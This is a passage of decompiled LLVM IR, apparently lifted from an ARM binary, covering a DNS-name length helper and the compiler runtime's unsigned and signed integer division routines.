  %v1_125583960 = phi i32 [ %v1_1255839, %bb34 ], [ %v1_125583952, %dec_label_pc_12558.preheader ]
  %v0_124f4.ph59 = phi i32 [ %v0_12558.pre.pre, %bb34 ], [ %v0_124b8, %dec_label_pc_12558.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_12554.pre, %bb34 ], [ 0, %dec_label_pc_12558.preheader ]
  br label %dec_label_pc_124dc

dec_label_pc_12564:                               ; preds = %bb34
  br i1 %v2_1256446, label %dec_label_pc_12564.bb36_crit_edge, label %bb35

dec_label_pc_12564.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_12564
  %v0_1256c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12578

bb35:                                             ; preds = %dec_label_pc_12558.preheader, %dec_label_pc_12564
  %v1_12568 = load i32, i32* %r8.global-to-local, align 4
  %v2_12568 = add i32 %v1_12568, 1
  store i32 %v2_12568, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12578

dec_label_pc_12578:                               ; preds = %dec_label_pc_12514, %bb35, %dec_label_pc_12564.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1256c.pre, %dec_label_pc_12564.bb36_crit_edge ], [ %v2_12568, %bb35 ], [ -1, %dec_label_pc_12514 ]
  store i32 %v3_124b4, i32* @r4, align 4
  store i32 %v6_124b4, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_124f4.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_12558, { 1, 0 }
  uselistorder i32 %v5_12504, { 0, 2, 1 }
  uselistorder i32 %v6_1255848, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1256450, { 1, 0 }
  uselistorder i32 %v0_124b8, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 0, 7, 38, 34, 39, 40, 41, 42, 43, 2, 73, 3, 44, 12, 45, 46, 47, 11, 48, 49, 51, 52, 53, 54, 55, 56, 57, 50, 14, 58, 26, 15, 27, 59, 60, 61, 17, 16, 8, 9, 62, 63, 64, 10, 18, 65, 28, 29, 66, 30, 31, 19, 35, 36, 4, 20, 67, 32, 33, 68, 69, 13, 21, 70, 71, 72, 37, 74, 1, 24, 23, 25, 22, 5, 6, 75 }
  uselistorder i8 46, { 0, 2, 3, 1, 4 }
  uselistorder i32 ()* @memcpy, { 14, 13, 18, 9, 8, 12, 11, 4, 7, 6, 3, 2, 17, 10, 1, 0, 5, 19, 16, 15 }
  uselistorder i32 64, { 0, 4, 9, 10, 2, 11, 13, 1, 7, 8, 12, 3, 5, 6 }
  uselistorder i32* @r3, { 9, 3, 10, 11, 20, 21, 12, 29, 30, 0, 31, 32, 33, 1, 34, 35, 36, 2, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 22, 23, 24, 25, 62, 63, 7, 8, 16, 19, 17, 18, 5, 4, 13, 14, 26, 27, 6, 28, 15 }
  uselistorder i32* @r2, { 36, 37, 9, 38, 39, 13, 40, 41, 10, 17, 18, 19, 42, 43, 44, 45, 12, 66, 46, 51, 52, 53, 54, 21, 11, 6, 91, 92, 93, 94, 67, 68, 2, 69, 72, 73, 70, 71, 7, 74, 20, 95, 96, 14, 15, 97, 98, 3, 99, 101, 102, 106, 90, 29, 30, 100, 55, 59, 60, 63, 61, 62, 56, 57, 58, 22, 64, 103, 23, 75, 76, 77, 1, 104, 5, 105, 78, 79, 80, 81, 8, 82, 83, 4, 84, 0, 85, 86, 47, 48, 49, 87, 24, 88, 50, 16, 25, 26, 27, 28, 31, 32, 33, 34, 35, 65, 89 }
  uselistorder i32* @r5, { 71, 72, 73, 74, 75, 76, 77, 8, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 5, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 25, 30, 9, 3, 31, 107, 111, 108, 109, 110, 21, 116, 112, 113, 114, 115, 117, 118, 119, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 10, 192, 193, 257, 258, 259, 120, 124, 11, 126, 125, 4, 127, 12, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 156, 155, 23, 163, 43, 44, 45, 46, 47, 48, 266, 267, 194, 195, 196, 197, 198, 199, 200, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 201, 202, 0, 203, 204, 205, 206, 207, 208, 280, 281, 282, 283, 284, 1, 285, 286, 287, 260, 261, 262, 263, 264, 265, 32, 33, 34, 35, 36, 37, 38, 49, 13, 7, 50, 39, 40, 51, 52, 53, 54, 55, 56, 57, 164, 165, 166, 167, 168, 169, 157, 158, 159, 160, 161, 162, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 288, 289, 290, 291, 209, 14, 210, 211, 212, 213, 15, 214, 215, 216, 217, 218, 16, 130, 131, 132, 17, 128, 129, 58, 59, 60, 133, 134, 135, 219, 220, 26, 221, 222, 18, 223, 224, 225, 226, 227, 228, 24, 229, 230, 231, 232, 27, 236, 19, 237, 238, 239, 240, 241, 242, 243, 244, 6, 245, 246, 247, 248, 249, 250, 28, 29, 233, 2, 234, 235, 42, 41, 22, 292, 293, 136, 137, 138, 139, 20, 140, 141, 251, 252, 253, 254, 255, 256, 121, 122, 123, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder label %dec_label_pc_12578, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_12564.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_124dc.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_12584 = load i32, i32* @r0, align 4
  store i32 %v0_12584, i32* @lr, align 4
  %v2_12584 = icmp eq i32 %v0_12584, 0
  br i1 %v2_12584, label %bb, label %dec_label_pc_1259c

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_12594:                               ; preds = %dec_label_pc_125a4
  %v1_12594 = add i32 %v1_125ac, 2
  br label %dec_label_pc_125c4

dec_label_pc_1259c:                               ; preds = %entry
  %v0_1259c = load i32, i32* @r1, align 4
  br label %dec_label_pc_125ac

dec_label_pc_125a4:                               ; preds = %dec_label_pc_125ac
  %v2_125bc = add i32 %v6_125ac, %v1_125b0
  %v2_125a4 = icmp eq i32 %v1_125b8, 192
  br i1 %v2_125a4, label %dec_label_pc_12594, label %dec_label_pc_125ac

dec_label_pc_125ac:                               ; preds = %dec_label_pc_125a4, %dec_label_pc_1259c
  %v1_125ac = phi i32 [ %v2_125bc, %dec_label_pc_125a4 ], [ %v0_1259c, %dec_label_pc_1259c ]
  %v2_125ac = add i32 %v1_125ac, %v0_12584
  %v3_125ac = inttoptr i32 %v2_125ac to i8*
  %v4_125ac = load i8, i8* %v3_125ac, align 1
  %v6_125ac = zext i8 %v4_125ac to i32
  %v1_125b0 = add i32 %v1_125ac, 1
  %v2_125b4 = icmp eq i8 %v4_125ac, 0
  %v1_125b8 = and i32 %v6_125ac, 192
  store i32 %v1_125b8, i32* @ip, align 4
  br i1 %v2_125b4, label %dec_label_pc_125c4, label %dec_label_pc_125a4

dec_label_pc_125c4:                               ; preds = %dec_label_pc_125ac, %dec_label_pc_12594
  %v1_125c4 = phi i32 [ %v1_12594, %dec_label_pc_12594 ], [ %v1_125b0, %dec_label_pc_125ac ]
  %v2_125c4 = sub i32 %v1_125c4, %v0_1259c
  ret i32 %v2_125c4

; uselistorder directives
  uselistorder i32 %v1_125b8, { 1, 0 }
  uselistorder i32 %v6_125ac, { 1, 0 }
  uselistorder i32 %v1_125ac, { 2, 1, 0 }
  uselistorder i32 %v0_12584, { 0, 2, 1 }
  uselistorder i32* @ip, { 31, 32, 33, 34, 35, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 8, 10, 48, 49, 50, 51, 52, 53, 54, 55, 11, 4, 87, 88, 89, 90, 56, 57, 59, 60, 61, 12, 92, 91, 1, 93, 94, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 95, 96, 97, 98, 99, 100, 101, 102, 157, 164, 17, 18, 0, 19, 20, 21, 22, 23, 26, 27, 28, 64, 65, 13, 5, 14, 7, 62, 6, 63, 66, 67, 68, 69, 70, 71, 85, 86, 158, 9, 40, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 162, 159, 160, 161, 2, 163, 103, 104, 105, 106, 107, 3, 108, 109, 110, 111, 112, 113, 58, 15, 16, 24, 25, 29, 30, 114 }
  uselistorder i8 0, { 55, 16, 23, 24, 56, 15, 20, 57, 25, 26, 27, 28, 29, 43, 61, 59, 42, 60, 58, 41, 35, 8, 9, 62, 63, 67, 68, 22, 52, 53, 64, 65, 66, 14, 69, 36, 44, 71, 0, 70, 45, 37, 72, 73, 74, 75, 76, 77, 10, 48, 81, 1, 79, 78, 46, 2, 80, 47, 3, 82, 83, 30, 4, 85, 84, 49, 86, 87, 88, 89, 38, 39, 91, 92, 90, 11, 12, 13, 93, 5, 94, 95, 17, 54, 97, 98, 99, 100, 96, 40, 101, 102, 103, 104, 105, 18, 106, 107, 31, 21, 6, 7, 109, 108, 32, 110, 111, 33, 112, 50, 19, 113, 114, 115, 116, 119, 117, 118, 120, 121, 122, 123, 126, 125, 51, 124, 127, 128, 129, 130, 131, 132, 133, 135, 134, 34, 136, 137, 138 }
  uselistorder i32 192, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32* @r1, { 40, 41, 1, 42, 43, 18, 44, 47, 45, 46, 9, 10, 22, 48, 49, 50, 51, 52, 53, 54, 55, 3, 56, 57, 89, 58, 59, 60, 61, 64, 66, 67, 68, 69, 70, 71, 4, 23, 24, 13, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 6, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 5, 163, 164, 11, 62, 63, 90, 91, 92, 93, 94, 95, 96, 97, 98, 14, 19, 20, 165, 2, 166, 112, 36, 37, 72, 77, 78, 81, 79, 80, 73, 74, 75, 76, 25, 82, 88, 167, 168, 169, 15, 99, 100, 101, 16, 102, 83, 84, 85, 86, 87, 7, 113, 114, 8, 12, 103, 104, 105, 0, 106, 107, 108, 17, 21, 109, 65, 110, 26, 111, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 115, 116 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_125cc = add i32 %arg2, -1
  %v7_125cc = icmp eq i32 %arg2, 1
  br i1 %v7_125cc, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_125d0 = load i32, i32* @r0, align 4
  ret i32 %v2_125d0

bb80:                                             ; preds = %entry
  %v2_125cc = icmp eq i32 %arg2, 0
  br i1 %v2_125cc, label %dec_label_pc_126b4, label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %bb80
  %v0_125d8 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_125d8, %arg2
  br i1 %tmp, label %dec_label_pc_125e0, label %dec_label_pc_1266c

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125d8
  %v2_125e0 = and i32 %v1_125cc, %arg2
  %v4_125e0 = icmp eq i32 %v2_125e0, 0
  br i1 %v4_125e0, label %dec_label_pc_12678, label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %dec_label_pc_125e0
  %v3_125e8 = icmp ult i32 %arg2, 536870912
  br i1 %v3_125e8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_125e8
  %v4_125ec = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_125e8, %.thread
  %v0_1260c.pr36.ph = phi i32 [ %v4_125ec, %.thread ], [ %arg2, %dec_label_pc_125e8 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_125e8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_1260c.pr36 = phi i32 [ %v4_12600, %bb83 ], [ %v0_1260c.pr36.ph, %.preheader.preheader ]
  %v1_12604 = phi i32 [ %v4_12604, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_125f8 = icmp ugt i32 %v0_1260c.pr36, 268435455
  br i1 %v2_125f8, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_1260cthread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_125fc = icmp ult i32 %v0_1260c.pr36, %v0_125d8
  br i1 %v4_125fc, label %bb82, label %dec_label_pc_1260cthread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_12600 = and i32 %v0_1260c.pr36, 268435456
  %v3_12600 = icmp eq i32 %v2_12600, 0
  %v4_12600 = mul i32 %v0_1260c.pr36, 16
  br i1 %v3_12600, label %bb83, label %dec_label_pc_1260c.loopexit

bb83:                                             ; preds = %bb82
  %v2_12604 = and i32 %v1_12604, 268435456
  %v3_12604 = icmp eq i32 %v2_12604, 0
  %v4_12604 = mul i32 %v1_12604, 16
  br i1 %v3_12604, label %.preheader, label %dec_label_pc_1260cthread-pre-split.loopexit.loopexit

dec_label_pc_1260cthread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_1261848.ph = phi i32 [ %v1_12604, %bb81 ], [ %v4_12604, %bb83 ]
  %v0_1260c.pr38.ph = phi i32 [ %v0_1260c.pr36, %bb81 ], [ %v4_12600, %bb83 ]
  br label %dec_label_pc_1260cthread-pre-split.loopexit

dec_label_pc_1260cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1260cthread-pre-split.loopexit.loopexit, %.thread2
  %v1_1261848 = phi i32 [ %v1_12604, %.thread2 ], [ %v1_1261848.ph, %dec_label_pc_1260cthread-pre-split.loopexit.loopexit ]
  %v0_1260c.pr38 = phi i32 [ %v0_1260c.pr36, %.thread2 ], [ %v0_1260c.pr38.ph, %dec_label_pc_1260cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1260cthread-pre-split

dec_label_pc_1260cthread-pre-split:               ; preds = %dec_label_pc_1260cthread-pre-split.loopexit, %bb85
  %v1_1261846 = phi i32 [ %v1_1261848, %dec_label_pc_1260cthread-pre-split.loopexit ], [ %v3_12618, %bb85 ]
  %v0_1260c.pr = phi i32 [ %v0_1260c.pr38, %dec_label_pc_1260cthread-pre-split.loopexit ], [ %v3_12614, %bb85 ]
  br label %dec_label_pc_1260c

dec_label_pc_1260c.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_1260c

dec_label_pc_1260c:                               ; preds = %dec_label_pc_1260c.loopexit, %dec_label_pc_1260cthread-pre-split
  %v1_12618 = phi i32 [ %v1_1261846, %dec_label_pc_1260cthread-pre-split ], [ %v1_12604, %dec_label_pc_1260c.loopexit ]
  %v1_12614 = phi i32 [ %v0_1260c.pr, %dec_label_pc_1260cthread-pre-split ], [ %v4_12600, %dec_label_pc_1260c.loopexit ]
  %v2_1260c = icmp slt i32 %v1_12614, 0
  br i1 %v2_1260c, label %dec_label_pc_12620, label %bb84

bb84:                                             ; preds = %dec_label_pc_1260c
  %v4_12610 = icmp ult i32 %v1_12614, %v0_125d8
  br i1 %v4_12610, label %bb85, label %dec_label_pc_12620

bb85:                                             ; preds = %bb84
  %v3_12614 = mul i32 %v1_12614, 2
  %v2_12618 = icmp slt i32 %v1_12618, 0
  %v3_12618 = mul i32 %v1_12618, 2
  br i1 %v2_12618, label %dec_label_pc_12620, label %dec_label_pc_1260cthread-pre-split

dec_label_pc_12620:                               ; preds = %bb84, %dec_label_pc_1260c, %bb85
  %v2_1262c59 = phi i32 [ %v3_12618, %bb85 ], [ %v1_12618, %bb84 ], [ %v1_12618, %dec_label_pc_1260c ]
  %v1_1262451 = phi i32 [ %v3_12614, %bb85 ], [ %v1_12614, %bb84 ], [ %v1_12614, %dec_label_pc_1260c ]
  br label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %.thread11, %dec_label_pc_12620
  %v1_12658 = phi i32 [ %v4_12658, %.thread11 ], [ %v2_1262c59, %dec_label_pc_12620 ]
  %v1_1262c = phi i32 [ %v0_12664, %.thread11 ], [ 0, %dec_label_pc_12620 ]
  %v1_1265c = phi i32 [ %v4_1265c, %.thread11 ], [ %v1_1262451, %dec_label_pc_12620 ]
  %v1_12628 = phi i32 [ %v0_12654, %.thread11 ], [ %v0_125d8, %dec_label_pc_12620 ]
  %v3_12624 = icmp ult i32 %v1_12628, %v1_1265c
  br i1 %v3_12624, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_12624
  %v3_12628 = sub i32 %v1_12628, %v1_1265c
  %v3_1262c = or i32 %v1_1262c, %v1_12658
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12624, %bb86
  %v1_12634 = phi i32 [ %v1_12628, %dec_label_pc_12624 ], [ %v3_12628, %bb86 ]
  %v1_12638 = phi i32 [ %v1_1262c, %dec_label_pc_12624 ], [ %v3_1262c, %bb86 ]
  %v4_12630 = udiv i32 %v1_1265c, 2
  %v6_12630 = icmp ult i32 %v1_12634, %v4_12630
  br i1 %v6_12630, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_12634 = urem i32 %v1_1265c, 2
  %v4_12634 = icmp eq i32 %v3_12634, 0
  %v6_12634 = sub i32 %v1_12634, %v4_12630
  br i1 %v4_12634, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_12638 = udiv i32 %v1_12658, 2
  %v6_12638 = or i32 %v1_12638, %v5_12638
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_12640 = phi i32 [ %v6_12634, %bb87 ], [ %v1_12634, %.thread7 ], [ %v6_12634, %bb88 ]
  %v1_12644 = phi i32 [ %v1_12638, %bb87 ], [ %v1_12638, %.thread7 ], [ %v6_12638, %bb88 ]
  %v4_1263c = udiv i32 %v1_1265c, 4
  %v6_1263c = icmp ult i32 %v1_12640, %v4_1263c
  br i1 %v6_1263c, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_12640 = and i32 %v1_1265c, 2
  %v4_12640 = icmp eq i32 %v3_12640, 0
  %v6_12640 = sub i32 %v1_12640, %v4_1263c
  br i1 %v4_12640, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12644 = udiv i32 %v1_12658, 4
  %v6_12644 = or i32 %v1_12644, %v5_12644
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_1264c = phi i32 [ %v6_12640, %bb89 ], [ %v1_12640, %.thread8 ], [ %v6_12640, %bb90 ]
  %v1_12650 = phi i32 [ %v1_12644, %bb89 ], [ %v1_12644, %.thread8 ], [ %v6_12644, %bb90 ]
  %v4_12648 = udiv i32 %v1_1265c, 8
  %v6_12648 = icmp ult i32 %v1_1264c, %v4_12648
  br i1 %v6_12648, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_1264c = and i32 %v1_1265c, 4
  %v4_1264c = icmp eq i32 %v3_1264c, 0
  %v6_1264c = sub i32 %v1_1264c, %v4_12648
  br i1 %v4_1264c, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_12650 = udiv i32 %v1_12658, 8
  %v6_12650 = or i32 %v1_12650, %v5_12650
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_12664 = phi i32 [ %v1_12650, %bb91 ], [ %v1_12650, %.thread9 ], [ %v6_12650, %bb92 ]
  %v0_12654 = phi i32 [ %v6_1264c, %bb91 ], [ %v1_1264c, %.thread9 ], [ %v6_1264c, %bb92 ]
  %v2_12654 = icmp eq i32 %v0_12654, 0
  br i1 %v2_12654, label %dec_label_pc_12664, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_12658, 16
  br i1 %tmp140, label %dec_label_pc_12664, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_12658 = udiv i32 %v1_12658, 16
  %v4_1265c = udiv i32 %v1_1265c, 16
  br label %dec_label_pc_12624

dec_label_pc_12664:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_12664

dec_label_pc_1266c:                               ; preds = %dec_label_pc_125d8
  %v9_125d8 = icmp eq i32 %v0_125d8, %arg2
  %. = zext i1 %v9_125d8 to i32
  ret i32 %.

dec_label_pc_12678:                               ; preds = %dec_label_pc_125e0
  %v2_12678 = icmp ugt i32 %arg2, 65535
  br i1 %v2_12678, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_12678
  %v2_1267c = and i32 %arg2, 32768
  %v3_1267c = icmp eq i32 %v2_1267c, 0
  %v4_1267c = udiv i32 %arg2, 65536
  br i1 %v3_1267c, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_12678
  %v0_1268865 = phi i32 [ %arg2, %dec_label_pc_12678 ], [ %v4_1267c, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_1268c = phi i32 [ %v0_1268865, %.thread16 ], [ %v4_1267c, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_12688 = icmp ugt i32 %v1_1268c, 255
  br i1 %v2_12688, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_1268c = and i32 %v1_1268c, 128
  %v3_1268c = icmp eq i32 %v2_1268c, 0
  %v4_1268c = udiv i32 %v1_1268c, 256
  br i1 %v3_1268c, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_12690 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_1269c = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_12690, %bb100 ]
  %v1_12698 = phi i32 [ %v1_1268c, %bb98 ], [ %v4_1268c, %bb99 ], [ %v4_1268c, %bb100 ]
  %v2_12694 = icmp ugt i32 %v1_12698, 15
  br i1 %v2_12694, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_12698 = and i32 %v1_12698, 8
  %v3_12698 = icmp eq i32 %v2_12698, 0
  %v4_12698 = udiv i32 %v1_12698, 16
  br i1 %v3_12698, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_1269c = add nsw i32 %v1_1269c, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_126a4 = phi i32 [ %v1_1269c, %.thread17 ], [ %v1_1269c, %bb101 ], [ %v2_1269c, %bb102 ]
  %v5_126a8 = phi i32 [ %v1_12698, %.thread17 ], [ %v4_12698, %bb101 ], [ %v4_12698, %bb102 ]
  %v2_126a0 = icmp ugt i32 %v5_126a8, 3
  %v7_126a0 = icmp eq i32 %v5_126a8, 4
  %v2_126a4 = xor i1 %v7_126a0, true
  %v3_126a4 = and i1 %v2_126a0, %v2_126a4
  br i1 %v3_126a4, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_126a4 = add nsw i32 %v4_126a4, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_126a8 = phi i32 [ %v4_126a4, %.thread18 ], [ %v5_126a4, %bb103 ]
  %v2_126a8 = xor i1 %v2_126a0, true
  %v3_126a8 = or i1 %v7_126a0, %v2_126a8
  br i1 %v3_126a8, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_126a8 = udiv i32 %v5_126a8, 2
  %v9_126a8 = add i32 %v4_126a8, %v8_126a8
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_126ac = phi i32 [ %v4_126a8, %bb104 ], [ %v9_126a8, %bb105 ]
  %v6_126ac = lshr i32 %v0_125d8, %v1_126ac
  ret i32 %v6_126ac

dec_label_pc_126b4:                               ; preds = %bb80
  %v0_126b4 = load i32, i32* @lr, align 4
  %v0_126b8 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_126b4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_126a8, { 1, 0 }
  uselistorder i1 %v7_126a0, { 1, 0 }
  uselistorder i32 %v4_12698, { 1, 0 }
  uselistorder i32 %v1_12698, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1268c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1268c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1267c, { 1, 0 }
  uselistorder i32 %v0_12654, { 1, 0 }
  uselistorder i32 %v4_12648, { 1, 0 }
  uselistorder i32 %v1_12650, { 1, 2, 0 }
  uselistorder i32 %v4_1263c, { 1, 0 }
  uselistorder i32 %v1_12644, { 1, 2, 0 }
  uselistorder i32 %v4_12630, { 1, 0 }
  uselistorder i32 %v1_12638, { 1, 2, 0 }
  uselistorder i32 %v1_1265c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1262c, { 1, 0 }
  uselistorder i32 %v1_12658, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12618, { 1, 0 }
  uselistorder i32 %v3_12614, { 1, 0 }
  uselistorder i32 %v1_12614, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12618, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12604, { 1, 0 }
  uselistorder i32 %v4_12600, { 2, 1, 0 }
  uselistorder i32 %v1_12604, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1260c.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_125d8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_12664, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12620, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1260cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_126c8 = udiv i32 %arg1, %arg2
  ret i32 %v2_126c8
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_126dc = icmp slt i32 %arg2, 0
  %v2_126dc = icmp eq i32 %arg2, 0
  %v0_126e0 = load i32, i32* @r0, align 4
  %v2_126e0 = xor i32 %v0_126e0, %arg2
  br i1 %v2_126dc, label %dec_label_pc_127f4, label %dec_label_pc_126e8

dec_label_pc_126e8:                               ; preds = %entry
  br i1 %v1_126dc, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_126e8
  %v2_126e8 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_126e8, %bb
  %v1_127b4 = phi i32 [ %v2_126e8, %bb ], [ %arg2, %dec_label_pc_126e8 ]
  %v1_126ec = add i32 %v1_127b4, -1
  %v7_126ec = icmp eq i32 %v1_127b4, 1
  br i1 %v7_126ec, label %dec_label_pc_12794, label %dec_label_pc_126f4

dec_label_pc_126f4:                               ; preds = %thread-pre-split
  %v1_126f4 = icmp slt i32 %v0_126e0, 0
  br i1 %v1_126f4, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_126f4
  %v2_126f8 = sub i32 0, %v0_126e0
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_126f4, %bb85
  %v0_127e8 = phi i32 [ %v0_126e0, %dec_label_pc_126f4 ], [ %v2_126f8, %bb85 ]
  %v3_126fc = icmp uge i32 %v0_127e8, %v1_127b4
  %v9_126fc = icmp eq i32 %v0_127e8, %v1_127b4
  %v2_12700 = xor i1 %v3_126fc, true
  %v3_12700 = or i1 %v9_126fc, %v2_12700
  br i1 %v3_12700, label %dec_label_pc_127a0, label %dec_label_pc_12704

dec_label_pc_12704:                               ; preds = %bb86
  %v2_12704 = and i32 %v1_126ec, %v1_127b4
  %v4_12704 = icmp eq i32 %v2_12704, 0
  br i1 %v4_12704, label %dec_label_pc_127b0, label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_12704
  %v3_1270c = icmp ult i32 %v1_127b4, 536870912
